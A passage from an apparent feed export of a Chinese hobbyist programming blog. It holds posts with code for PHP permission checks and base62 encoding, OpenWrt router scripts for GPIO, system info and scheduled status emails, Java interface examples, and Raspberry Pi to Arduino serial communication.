        if($input==7 || $input==6 || $input==3 || $input==2) $res[1]=&quot;w&quot;;
        else return false;
    }
    preg_match(&quot;/x/i&quot;, $expected, $matches);
    if($matches){//exec
        if($input==7 || $input==5 || $input==3 || $input==1) $res[2]=&quot;x&quot;;
        else return false;
    }
    return $res;
}
</code></pre><p>期望的权限expected为字母，输入权限为input，如果用户权限不足，返回false。</p>
<p><br></p>
<p>通信传输常用的base加密代码片段</p>
<pre><code>class base{
    //private $string = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+*#@&quot;;
    private $string = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
    private $base = 62;

    public function base62_encode($str) {
        $out = &#39;&#39;;
        for($t=floor(log10($str)/log10( $this-&gt;base )); $t&gt;=0; $t--) {
            $a = floor($str / pow( $this-&gt;base, $t));
            $out = $out.substr($this-&gt;string, $a, 1);
            $str = $str - ($a * pow( $this-&gt;base, $t));
        }     
        return $out;
    }
    public function base62_decode($str) {
        $out = 0;
        $len = strlen($str) - 1;
        for($t=0; $t&lt;=$len; $t++) {
            $out = $out + strpos($this-&gt;string, substr($str, $t, 1)) * pow( $this-&gt;base, $len - $t);
        } 
        return substr(sprintf(&quot;%f&quot;, $out), 0, -7);
    } 
}
</code></pre><p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-05-12-think-about-web-develop"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-05-12-think-about-web-develop" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/05/12/think-about-web-develop/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/05/12/think-about-web-develop/">http://homeway.me/2015/05/12/think-about-web-develop/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-05-12 1:29:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[OpenWrt路由器开发]]></title>
      <url>http://homeway.me/2015/04/29/openwrt-develop-base-util/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-openwrt.png" alt="OpenWrt"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>第一次尝试开发路由器，发现并不是想象中那么难，和普通嵌入式开发一样，也是一块ARM板刷上Linux系统。</p>
<p>OpenWrt有很多好用的软件，附带流量监测。</p>
<p>OpenWrt主要开发语言为Python、Lua、Shell，还可以做深入研究写ipk软件包。</p>
<p>写了几个脚本，主要实现了openwrt下面GPIO控制、系统信息获取、wifi扫描器、定时发送邮件系统报警等功能，下面会介绍。</p>
<p>代码已经在Github开源：    <a href="https://github.com/grasses/OpenWRT-Util" target="_blank" rel="external">https://github.com/grasses/OpenWRT-Util</a></p>
<p><br><hr></p>
<h1 id="0x02-About-OpenWrt"><a href="#0x02-About-OpenWrt" class="headerlink" title="0x02.About OpenWrt"></a>0x02.About OpenWrt</h1><p>刷OpenWrt先要去<a href="https://downloads.openwrt.org/" target="_blank" rel="external">https://downloads.openwrt.org/</a>下载你想要的版本，包含aa型和bb型。</p>
<p>然后用Linux烧入命令烧入系统。</p>
<p>早MAC下面，先现将U盘插入电脑格式化，然后运行命令查看U盘编号：</p>
<blockquote>
<p>diskUtil list</p>
</blockquote>
<p>注意查看U盘编号，选择你的U盘，解除挂载：</p>
<blockquote>
<p>diskUtil unmountDisk /dev/disk2</p>
</blockquote>
<p>然后烧入系统：</p>
<blockquote>
<p>dd if=/path/to/openwrt.img of=/dev/disk2 bs=2m</p>
</blockquote>
<p>等待几分钟后烧入成功。</p>
<h4 id="关于痛点："><a href="#关于痛点：" class="headerlink" title="关于痛点："></a>关于痛点：</h4><pre><code>第一次是在树莓派上安装OpenWrt，装好后，用有线把连进上级路由器的Lan口

然后，上级路由的包开始乱了，上级路由把OpenWrt当成路由器，OpenWrt把路由器当成上级路由器，然后就GG了。
</code></pre><p><br><hr></p>
<h1 id="0x03-About-WRTnode"><a href="#0x03-About-WRTnode" class="headerlink" title="0x03.About WRTnode"></a>0x03.About WRTnode</h1><p>WRTnode是OpenWrt系统一个硬件解决方案，预先安装了OpenWrt相关软件包，并且内置两块无线网卡。</p>
<p>关于WRTnode，官方wiki已经介绍的很详细了：<a href="http://wiki.wrtnode.com/index.php?title=Main_Page/zh-cn" target="_blank" rel="external">http://wiki.wrtnode.com/index.php?title=Main_Page/zh-cn</a></p>
<p>解析来的代码基本上是在WRTnode环境上开发的，主要包含了：</p>
<ul>
<li><p>luci(WRTnode自带，非WRTnode用opkg安装即可)</p>
</li>
<li><p>python(WRTnode自带，非WRTnode用opkg安装即可)</p>
</li>
<li><p>luasocket( <a href="http://see.sl088.com/wiki/Luasocket" target="_blank" rel="external">http://see.sl088.com/wiki/Luasocket</a> )</p>
</li>
</ul>
<p>目前只能想起这3个，如果报错，该装什么再装好了。</p>
<p><br><hr></p>
<h1 id="0x04-WRTnode控制GPIO"><a href="#0x04-WRTnode控制GPIO" class="headerlink" title="0x04.WRTnode控制GPIO"></a>0x04.WRTnode控制GPIO</h1><p>GPIO控制可以很好地实现软件硬件之间的交互。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-04-29-openwrt-gpio.jpg" alt="WRTnode GPIO"></p>
<p>GPIO的控制也不难，wiki讲得很清晰了，就是文件输入输出<a href="http://wiki.wrtnode.com/index.php?title=The_user_space_gpio_calls/zh-cn" target="_blank" rel="external">http://wiki.wrtnode.com/index.php?title=The_user_space_gpio_calls/zh-cn</a></p>
<p>这里我写了一个Lua版的GPIO控制模块，文件保存为gpio.lua：</p>
<pre><code>#!/usr/bin/lua
--[[
Copyright 2015 http://homeway.me
@author homeway
@version 15.04.29
@link http://homeway.me
@function OpenWRT gpio module
-- ]]--

local M = {}
M.id = &quot;&quot;
M.path = &quot;/sys/class/gpio/gpio&quot;
M.router = &quot;/sys/class/gpio&quot;

M.check = function(where)
    print(&quot;check path =&gt; &quot;..where)
    local f=io.open(where, &quot;r&quot;)
      if f~=nil then io.close(f) return true else return false end
end
-- set mode &amp;&amp; check type
M.mode = function(id, mtype)
    M.id = id
    where = M.path..M.id
    -- if id not use
    if false==M.check(M.path..id..&#39;/direction&#39;) then
        --M.writeFile(M.router..&quot;/unexport&quot;,id)
        M.writeFile(M.router..&quot;/export&quot;, id)
      end
      -- if type different 
      if mtype ~= M.readFile(M.path..id..&#39;/direction&#39;) then
          print(&quot;type =&gt;&quot;..mtype..&quot; direction=&gt;&quot;..M.readFile(M.path..id..&#39;/direction&#39;)..&quot; different&quot;)
          M.writeFile(M.path..id..&#39;/direction&#39;, mtype)
      end
end
-- file write
M.writeFile = function(where, what)
    print(&quot;write path =&gt; &quot;..where..&quot; data =&gt;&quot;..what)
    local fp=io.open(where, &#39;w&#39;)
      fp:write(what)
      fp:close()    
end
-- file read
M.readFile = function(where)
    print(&quot;read path =&gt; &quot;..where)
      local fp=io.open(where, &#39;r&#39;)
      if fp~=nil then
        data = fp:read(&quot;*all&quot;)
        fp:close()
        return data
      end
      return nil
end
M.set = function(id)
    M.id = id
end
M.read = function()
      res = M.readFile(M.path..M.id..&#39;/value&#39;)
      return res
end
M.write = function(value)
      res = M.writeFile(M.path..M.id..&#39;/value&#39;, value)
end
M.close = function()
    print(&quot;sleep io =&gt; &quot;..M.id)
    os.execute(&quot;sleep &quot; .. tonumber(M.id))
end

return M
</code></pre><p>API很简单，先设置设置模式，GPIO.mode(id, “out/in”)两种模式之一</p>
<p>如果为’out’即可调用GPIO.write(value)函数，写入当然id端口，如果为’in’模式，只能调用GPIO.read()读取数值。</p>
<p>这里数值只能是0或1，非0即为1.</p>
<p>调用方式如下，这个存在一个可忽略的问题，一旦调用mode，数值将被置为默认数值，即0：</p>
<pre><code>#!/usr/bin/lua
x=require(&quot;gpio&quot;)
print(&quot;Please input io id =&gt;&quot;)
id = io.read(&quot;*num&quot;)
x.mode(id, &quot;out&quot;)-- 设置io的模式为输入还是输出 [in/out]
function readGPIO(id)
    value = x.read()
    print(&quot;read data from =&gt; `&quot;..id..&quot;` =&gt;&quot;..value)
end
function writeGPIO(id, data)
    x.write(data)
    print(&quot;write data to =&gt; `&quot;..id..&quot;` =&gt;&quot;..data)
end

count=1
repeat
    count=count+1
    print(&quot;Please input value =&gt;&quot;)
    data = io.read(&quot;*num&quot;)
    writeGPIO(id, data)
    readGPIO(id)
until count&gt;3
</code></pre><p><br><hr></p>
<h1 id="0x05-WRTnode获取系统信息"><a href="#0x05-WRTnode获取系统信息" class="headerlink" title="0x05.WRTnode获取系统信息"></a>0x05.WRTnode获取系统信息</h1><p>其实获取系统信息不属于WRTnode范围，因为这部分主要是调用Linux Shell获取系统信息，做个反馈。</p>
<p>这里我也写了个python脚本，主要检查系统信息，这个脚本在树莓派那里面也有：<a href="http://homeway.me/2014/10/09/raspberry-the-current-status-and-data/">http://homeway.me/2014/10/09/raspberry-the-current-status-and-data/</a></p>
<p>这里我做了部分修改，添加系统ip、连接的ssid等信息：</p>
<pre><code>#!/usr/bin/python
&#39;&#39;&#39;
    @author homeway
    @version 15.04.29
    @link http://homeway.me
    @function python get OpenWRT system info
&#39;&#39;&#39;
import os
# Return CPU temperature as a character string                                     
def getCPUtemperature():
    res = os.popen(&#39;vcgencmd measure_temp&#39;).readline()
    return(res.replace(&quot;temp=&quot;,&quot;&quot;).replace(&quot;&#39;C\n&quot;,&quot;&quot;))
# Return RAM information (unit=kb) in a list                                      
# Index 0: total RAM                                                              
# Index 1: used RAM                                                                
# Index 2: free RAM                                                                
def getRAMinfo():
    p = os.popen(&#39;free&#39;)
    i = 0
    while 1:
        i = i + 1
        line = p.readline()
        if i==2:
            return(line.split()[1:4])
# Return % of CPU used by user as a character string                               
def getCPUuse():
    return(str(os.popen(&quot;top -n1 | awk &#39;/Cpu\(s\):/ {print $2}&#39;&quot;).readline().strip()))

# Return information about disk space as a list (unit included)                    
# Index 0: total disk space                                                        
# Index 1: used disk space                                                        
# Index 2: remaining disk space                                                    
# Index 3: percentage of disk used                                                 
def getDiskSpace():
    p = os.popen(&quot;df -h /&quot;)
    i = 0
    while 1:
        i = i +1
        line = p.readline()
        if i==2:
            return(line.split()[1:5])
def getSystem():
    p = os.popen(&quot;uname -amnrspv&quot;)
    while 1:
        line = p.readline()
        return(line)
def getExtranetIp():
    p = os.popen(&#39;wget &quot;http://www.ip138.com/ips1388.asp&quot; -q -O - | sed -nr \&#39;s/.*\[(([0-9]+\.){3}[0-9]+)\].*/\1/p\&#39;&#39;)
    while 1:
        line = p.readline()
        print line
        return(line)
def getIntranetIp():
    p = os.popen(&#39;ifconfig apcli0 | grep inet\ addr&#39;)
    while 1:
        line = p.readline()
        return(line)
def getSsid():
    p = os.popen(&#39;uci get wireless.@wifi-iface[0].ApCliSsid&#39;)
    while 1:
        line = p.readline()
        return(line)
# CPU informatiom
CPU_temp = getCPUtemperature()
CPU_usage = getCPUuse()
# RAM information
# Output is in kb, here I convert it in Mb for readability
RAM_stats = getRAMinfo()
RAM_total = round(int(RAM_stats[0]) / 1000,1)
RAM_used = round(int(RAM_stats[1]) / 1000,1)
RAM_free = round(int(RAM_stats[2]) / 1000,1)
# Disk information
DISK_stats = getDiskSpace()
DISK_total = DISK_stats[0]
DISK_used = DISK_stats[1]
DISK_perc = DISK_stats[3]
# system info
SYSTEM_info = getSystem()
# NET infomation
NET_extranet_ip = getExtranetIp()
NET_internet_ip = getIntranetIp().lstrip(&#39;&#39;)
NET_connect_ssid = getSsid()

if __name__ == &#39;__main__&#39;:
    print(&#39;-------------------------------------------&#39;)
    print(&quot;System info =&quot;+str(SYSTEM_info))
    print(&#39;-------------------------------------------&#39;)
    print(&#39;RAM Total = &#39;+str(RAM_total)+&#39; MB&#39;)
    print(&#39;RAM Used = &#39;+str(RAM_used)+&#39; MB&#39;)
    print(&#39;RAM Free = &#39;+str(RAM_free)+&#39; MB&#39;)
    print(&#39;-------------------------------------------&#39;)
    print(&#39;DISK Total Space = &#39;+str(DISK_total)+&#39;B&#39;)
    print(&#39;DISK Used Space = &#39;+str(DISK_used)+&#39;B&#39;)
    print(&#39;DISK Used Percentage = &#39;+str(DISK_perc))
    print(&#39;-------------------------------------------&#39;)
    print(&#39;NET Extranet Ip =&#39;+str(NET_extranet_ip))
    print(&#39;NET Connect Ssid =&#39;+str(NET_connect_ssid))
    print(&#39;NET Internet Wan Ip =&#39;+str(NET_internet_ip))
</code></pre><p>直接调用<code>python sysinfo.py</code>:</p>
<p><img src="https://static.blog.homeway.me/blog/2015-04-29-openwrt-sysinfo.png" alt="系统信息"></p>
<p><br><hr></p>
<h1 id="0x06-WRTnode发送邮件"><a href="#0x06-WRTnode发送邮件" class="headerlink" title="0x06.WRTnode发送邮件"></a>0x06.WRTnode发送邮件</h1><p>好了，系统信息有了，GPIO信息有了，接下来就试试发送邮件了。</p>
<p>发送邮件3中法案都可以，Lua，Python，Shell，找了找资料，Python写了，但是缺少了一个包，Lua缺少Luasocket模块，Shell要安装模块。</p>
<p>最后，懵了，全都要依赖，尼玛，看了看，好像Lua安装个Luasocket最简单，一个包轻松： <a href="http://see.sl088.com/wiki/Luasocket" target="_blank" rel="external">http://see.sl088.com/wiki/Luasocket</a> </p>
<p>安装也不难，接下来就写写吧。</p>
<p>Lua发送邮件源码模块，设置文件名为<code>email.lua</code>：</p>
<pre><code>#!/usr/bin/lua
--[[
Copyright 2015 http://homeway.me
@author homeway
@version 15.04.29
@link http://homeway.me
@function lua email module
-- ]]--
local smtp = require(&quot;socket.smtp&quot;)
local M ={}
M.user = {[&quot;from&quot;]=&quot;&quot;, [&quot;to&quot;]=&quot;&quot;, [&quot;password&quot;]=&quot;&quot;}
M.mail = {[&quot;subject&quot;]=&quot;&quot;, [&quot;body&quot;]=&quot;&quot;}
M.sys = {[&quot;server&quot;]=&quot;&quot;}
M.set = function(data)
    M.user = data.user
    M.mail = data.mail
    M.sys = data.sys    
end
M.send = function()
    rcpt = {
        M.user[&quot;to&quot;]
    }
    mesgt = {
        headers = {
            from = M.user[&quot;from&quot;],
            to = M.user[&quot;to&quot;], --收件人
            cc = &quot;&quot;, --抄送 
            subject = M.mail[&quot;subject&quot;] --主题
        },
        body = M.mail[&quot;body&quot;]
    }
    r, e = smtp.send{
        from = M.user[&quot;from&quot;],
        rcpt = rcpt,
        source = smtp.message(mesgt),
        server = M.sys[&quot;server&quot;],
        port = M.sys[&quot;port&quot;],
        user = M.user[&quot;from&quot;],
        password = M.user[&quot;password&quot;],
    }
    if not r then
        print(e)
    else
        print(&quot;send ok!&quot;)
    end
end
return M
</code></pre><p>下面是调用方式：</p>
<pre><code>#!/usr/bin/lua
local mail = require(&quot;email&quot;)
local data = {}
data.user = {[&quot;from&quot;]=&quot;sender@gmail.com&quot;, [&quot;to&quot;]=&quot;receiver@gmail.com&quot;, [&quot;password&quot;]=&quot;password&quot;}
data.mail = {[&quot;subject&quot;]=&quot;测试邮件模块&quot;, [&quot;body&quot;]=&quot;这是主体内容...&quot;}
data.sys = {[&quot;server&quot;]=&quot;smtp.gmail.com&quot;, [&quot;port&quot;]=587}

mail.set(data)
mail.send()
</code></pre><p>测试下，是可以接收到邮件的，注意GFW，还是别用非法gmail好了，别等半天收不到。</p>
<p><br><hr></p>
<h1 id="0x07-重要的东西放后面"><a href="#0x07-重要的东西放后面" class="headerlink" title="0x07.重要的东西放后面"></a>0x07.重要的东西放后面</h1><p>嗯！看到这里，估计菊花也有点疼了，再看最后一点看完就擦洗擦洗去吧。</p>
<p>最后就是，设置定时器，让路由器定时发送系统信息给指定邮箱。</p>
<p>嗯…定时器，Linux的一个模块crontab命令，看看功能吧 <code>crontab --help</code></p>
<p>关于定时器语法，看看这里吧 <a href="http://kvz.io/blog/2007/07/29/schedule-tasks-on-linux-using-crontab/" target="_blank" rel="external">http://kvz.io/blog/2007/07/29/schedule-tasks-on-linux-using-crontab/</a></p>
<p>这里，我只做简单地，每隔10分钟发送一次系统信息给我邮箱。</p>
<p>具体怎么做，去下载这个脚本吧：<a href="https://github.com/grasses/OpenWRT-Util/blob/master/lua/crontab.lua" target="_blank" rel="external">https://github.com/grasses/OpenWRT-Util/blob/master/lua/crontab.lua</a></p>
<p>我的目录是这样的，用户是root：</p>
<pre><code>~|--script
    |--schedule
    |--send
|--log
     |--sys.log
     |--crontab.log
</code></pre><p>先开一个定时器，定时跑Lua，Lua调用python读取系统信息，生成日志文件，Lua读取日志文件，发送邮箱。</p>
<p>how to use:<br>step1: configure you email information in this script<br>step2: mkdir /root/log &amp;&amp; mkdir /root/script<br>step3: mv /path/to/crontab.lua /root/script/send<br>step4: chmod +x /root/script/send<br>step5: echo 10,20,30,40,50  <em> </em> <em> </em> /root/script/send &gt; /root/script/schedule<br>step6: crontab /root/script/schedule</p>
<p>东西有点多，都是散乱的部件，这篇主要介绍细节信息，接下来会做大得模块。</p>
<p>如果打通路由器，各种嵌入式开发的联网问题就都解决了，所以路由器系统还是很重要的。</p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-29-openwrt-develop-base-util"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-29-openwrt-develop-base-util" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/04/29/openwrt-develop-base-util/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/04/29/openwrt-develop-base-util/">http://homeway.me/2015/04/29/openwrt-develop-base-util/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-04-29 23:59:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Java思想之容器implements与接口interface处理]]></title>
      <url>http://homeway.me/2015/04/13/Java-implements-and-interface/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-java.png" alt="Java"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>查了一些国内资料，都说java中extended与implements的区别是，一个类只能有一个继承，一个类可以有多个容器。</p>
<p>后来去看了些国外资料。</p>
<p>在我理解上，interface就是一个公共的类，可以包含公共函数、变量。</p>
<p>Java接口是用于指定一组抽象方法的类来实现一个抽象类型。</p>
<p>当一个类实现一个接口，它必须继承所有的内声明的抽象方法，好像签订了一份合同，并履行协议。</p>
<p><hr><br></p>
<h1 id="0x02-Example"><a href="#0x02-Example" class="headerlink" title="0x02.Example"></a>0x02.Example</h1><p>先来看看怎么声明一个接口，文件保存为 <code>InterFace.java</code>：</p>
<pre><code>public class InterFace {
    public static void main(String[] args) {
        MyTest x = new MyTest();
        x.speak();
        x.say();
        x.fuck();
    }
}
class MyTest implements MyInterface2, MyInterface3 {
    @Override
    public void speak() {
        System.out.println(&quot;MyTest Called =&gt; jump() =&gt;&quot;+MyInterface.hello);
    }
    @Override
    public void fuck() {
        System.out.println(&quot;MyTest Called =&gt; fuck()&quot;);
    }
    @Override
    public void say() {
        System.out.println(&quot;MyTest Called =&gt; say()&quot;);
    }    
}
interface MyInterface1{
    public String hello = &quot;hello&quot;;
    public void speak();
}
interface MyInterface2{
    public int num = 1;
    public void fuck();
}
// 接口之间可以相互继承
interface MyInterface3 extends MyInterface1{
    public void say();
}
</code></pre><p>输出如下：</p>
<pre><code>$javac InterFace.java
$java InterFace

MyTest Called =&gt; jump() =&gt;hello
MyTest Called =&gt; say()
MyTest Called =&gt; fuck()
</code></pre><p>这里我们声明了3个接口，并且interface3继承自interface1，所以当类容器导入接口interface3就会导入父类接口interface1。</p>
<p>只要添加了容器implements，就会包含接口中的所有东西，所以必须在<code>MyTest</code>类中添加该重写函数，否则找不到该函数会报错。</p>
<hr>

<p>再看下面一个例子，多个类共同使用一个interface接口，保存为<code>Account.java</code>：</p>
<pre><code>interface Transaction {
    int BALANCE = 500;
    Object transaction(Object input);
}
class CurrentAccount implements Transaction {
    int bal;
    public Object transaction(Object input) {
        this.bal = BALANCE - (int)input;
        return bal;
    }
    public String toString() { return &quot;Current acc&quot;; }
}
class SavingsAccount implements Transaction {
    int bal;
    public Object transaction(Object input) {
        this.bal = BALANCE + (int)input;
        return bal;
    }
    public String toString() { return &quot;Savings acc&quot;; }
}
public class Account {
    public static void payment(Transaction t, Object input) {
        System.out.println(t + &quot; is debited:   &quot; +  t.transaction(input));
    }
    public static void deposit(Transaction t, Object input) {
        System.out.println(t + &quot; is credited:   &quot; +  t.transaction(input));
    }
    public static void main(String[] args) {
        Integer input = new Integer(600);
        deposit(new SavingsAccount(), input);
        payment(new CurrentAccount(), input);
    }
}
</code></pre><p>代码输出：</p>
<pre><code>$javac Account.java
$java Account

Savings acc is credited:   1100
Current acc is debited:   -100
</code></pre><p>一个接口可以供多个类共同使用，并且多个类之间使用不冲突，这样看来，interface倒有点像是静态函数了。</p>
<p>观察一下这两个实现类活期账户和储蓄账户自动的向上转型在接受Transaction接口Account类中的方法。</p>
<p>payment()和deposit()方法利用我们所讲的战略设计模式，代表了接口的实现完全脱钩的一个实例。</p>
<p>从理论上说，你可以适应任何类，只需使它们符合的界面，使用这些方法。</p>
<hr>

<p>对于接口与容器，我见过的一个更具有实用价值的地方，在于类之间的监听函数调用。</p>
<p>类似于js中的事件驱动函数，当有事件发生时候，通过回调函数，通知主函数。</p>
<p>实例代码如下，文件命名为Homeway.java：</p>
<pre><code>public class Homeway {
    public static void main(String[] args) {
        System.out.println(&quot;\n=======================Implements======================\n&quot;);
        ClassImplements mClassImplements = new ClassImplements();
        mClassImplements.run();
    }
}
class ClassImplements implements Implements1.Listener {
    public Implements1 mImplements1 = null;
    public ClassImplements(){
        mImplements1 = new Implements1();
        mImplements1.setListener(this);
    }
    @Override
    public void onCallStart(){
        System.out.println(&quot;ClassImplements =&gt; onCallStart()&quot;);
    }
    @Override
    public void onCallStop(){
        System.out.println(&quot;ClassImplements =&gt; onCallStop()&quot;);
    }
    public void run(){
        mImplements1.run();
    }
}
//test 2level implements for class
class Implements1 implements Implements2.Listener {
    private Listener mListener;
    private Implements2 mImplements2;
    public Implements1(){
        mImplements2 = new Implements2();//把当前类传给下个类
        mImplements2.setListener(this);
        System.out.println(&quot;Init Implements1 =&gt;...&quot;);
    }
    public static interface Listener {
        void onCallStart();
        void onCallStop();
    }
    public void setListener(Listener listener) {
        mListener = listener;
    }
    @Override
    public void onCallStart(){
        System.out.println(&quot;Implements1 =&gt; onCallStart()&quot;);
        mListener.onCallStart();//call at Implements1 and then throw to ClassImplements
    }
    @Override
    public void onCallStop(){
        System.out.println(&quot;Implements1 =&gt; onCallStop()&quot;);
        mListener.onCallStop();//call at Implements1 and then throw to ClassImplements
    }
    public void run(){
        this.mImplements2.run();
    }
}

//3 level implement test
class Implements2{
    private Listener mListener;
    public Implements2(){
        System.out.println(&quot;Init Implements2 =&gt;...&quot;);
    }
    public static interface Listener {
        void onCallStart();
        void onCallStop();
    }
    public void setListener(Listener listener) {
        mListener = listener;
    }
    public void onCallStart(){
        System.out.println(&quot;Implements2 =&gt; onCallStart()&quot;);
    }
    public void onCallStop(){
        System.out.println(&quot;Implements2 =&gt; onCallStop()&quot;);
    }
    public void run() {
        System.out.println(&quot;Run some functions and then callback from Listener...&quot;);
        mListener.onCallStart();
        mListener.onCallStop();
    }

}
</code></pre><p>输出如下：</p>
<pre><code>$javac Homeway.java
$java Homeway
=======================Implements======================
Init Implements2 =&gt;...
Init Implements1 =&gt;...
Run some functions and then callback from Listener...
Implements1 =&gt; onCallStart()
ClassImplements =&gt; onCallStart()
Implements1 =&gt; onCallStop()
ClassImplements =&gt; onCallStop()
</code></pre><p>我们先是声明了类ClassImplements，这个是我们的主类，并且implements了<code>Implements1.Listener</code>通过一个Listener建立了监听接口，</p>
<p>然后<code>Implements1</code>又implements了<code>Implements2.Listener</code>建立了第2级的监听。</p>
<p>一旦<code>Implements1</code>或<code>Implements2</code>内的某个函数触发了某个事件，就能通过监听接口发送给主函数<code>ClassImplements</code>，类似js中的事件回调函数。</p>
<p>父类与子类通过Listener实现接口调用，此时Listener即为父类本身。</p>
<p>大致的模型如下：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-04-13-java-implements-and-interface.jpg" alt="模型"></p>
<p>implements容器与interface接口在java类中有很多很好用的模型，有时间该多去研究研究。</p>
<p><hr><br></p>
<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ul>
<li><p><a href="http://tutorials.jenkov.com/java/interfaces.html" target="_blank" rel="external">《Java Interfaces》</a></p>
</li>
<li><p><a href="https://weblogs.java.net/blog/hellofadude/archive/2014/01/18/java-interfaces-and-concept-multiple-inheritance" target="_blank" rel="external">《Java interfaces and the concept of multiple inheritance》</a> </p>
</li>
<li><p><a href="https://blog.udemy.com/java-interface-example/" target="_blank" rel="external">《Java Interface Example, Explanation, and Implementation》</a></p>
</li>
</ul>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-13-java-implements-and-interface"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-13-java-implements-and-interface" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/04/13/java-implements-and-interface/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/04/13/java-implements-and-interface/">http://homeway.me/2015/04/13/java-implements-and-interface/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-04-13 20:10:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Raspberry与Arduino建立不可靠串口通信]]></title>
      <url>http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-arduino.png" alt="Arduino"></p>
<a id="more"></a>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>Arduino与Raspberry通过Serial通信的方案一般有两种，通过树莓派GPIO串口通信，还有，通过USB串口通信。</p>
<p>显然，通过USB通信比GPIO通信高效稳定多了。</p>
<p>看过TCP握手通信的人都应该明白，通信双方通信要通过3此握手才能开启TCP连接。</p>
<p>相同的，串口通信也是可以这么理解，我之前尝试通过简单地发送与接收来传递信息，发现，不但有信息丢包，而且各种问题。</p>
<p>举个例子，A-&gt;R，A串口写入，R串口监听；R-&gt;A，R写入时候，A监听。</p>
<p>那么好了，时间怎么约定？A写入要多久？B要监听多久？我们都知道，Arduino是单线程的，所以Arduino的串口通信是单信道。</p>
<h1 id="0x02-Coding"><a href="#0x02-Coding" class="headerlink" title="0x02.Coding"></a>0x02.Coding</h1><p>这里串口的波特率设置成9600，所以还要做串口波特率修改（你可以用原始的 115200），但是对树莓派的性能不要指望太多，太快不好。</p>
<p>关于修改串口波特率可以看这里，或者你懒不改也行：<a href="http://blog.miguelgrinberg.com/post/a-cheap-bluetooth-serial-port-for-your-raspberry-pi" target="_blank" rel="external">http://blog.miguelgrinberg.com/post/a-cheap-bluetooth-serial-port-for-your-raspberry-pi</a></p>
<p>这里Arduino输出是string格式，我们要在树莓派那里转成dict字典模式方便调用，所以，约定数据格式为 </p>
<p><code>{&#39;result&#39;:True/False, &#39;data&#39;:&#39;...&#39;}</code>，在Arduino端用 <code>-</code> 断开字符串。</p>
<p>好了，下面是Arduino：</p>
<pre><code>String readString; 
String data;
String flag;
void setup()
{
  Serial.begin(9600);
}
void loop()
{
    while(!Serial.available()) {}
    while (Serial.available()) {
        if (Serial.available() &gt;0) {
            char c = Serial.read();
            readString += c;
        }
    }

    if (readString.length() &gt;0) {
        flag = &quot;True&quot;;
        data = flag+&quot;-&quot;+readString;
        Serial.println(data);
        readString=&quot;&quot;;
        delay(200);
    }
    Serial.flush();
}
</code></pre><p>关于Raspberry端代码：</p>
<pre><code>#!/usr/bin/python
import serial
import json
import syslog,time,sys

port = &#39;/dev/tty.usbmodem1411&#39;
def main(port):
    ard = serial.Serial(port,9600,timeout=1)
    i = 0
    send =&quot;&quot;
    time.sleep(1.5)
    while (i&lt;5):
        send += &#39;Everything Ok~&#39;
        ard.flush()
        send = str(send)
        print (&quot;Python value sent: &quot;)
        print (send)
        ard.write(send)

        msg = ard.readline().strip(&#39;\n\r&#39;) #ard.read(ard.inWaiting()).strip(&#39;\n\r&#39;) 
        print (&quot;Message from arduino: &quot;)

        try:
            key = [&#39;result&#39;,&#39;data&#39;]
            value = msg.split(&#39;-&#39;,2)
            data = dict(zip(key,value))
        except:
            print &#39;ERROR!&#39;
        print msg

        time.sleep(0.3)
        i = i + 1
    else:
        print &quot;Exiting&quot;
    exit()

if __name__ == &#39;__main__&#39;:
    try:
        main(sys.argv[1] if len(sys.argv) &gt; 1 else port )
    except KeyboardInterrupt:
        ser.close()
</code></pre><p>关于端口自己查找 <code>ls /dev/tty*</code></p>
<p>这里有2个时间延迟，第一个是做串口初始化等待，第二个是等待数据传输。</p>
<p><br><hr><br></p>
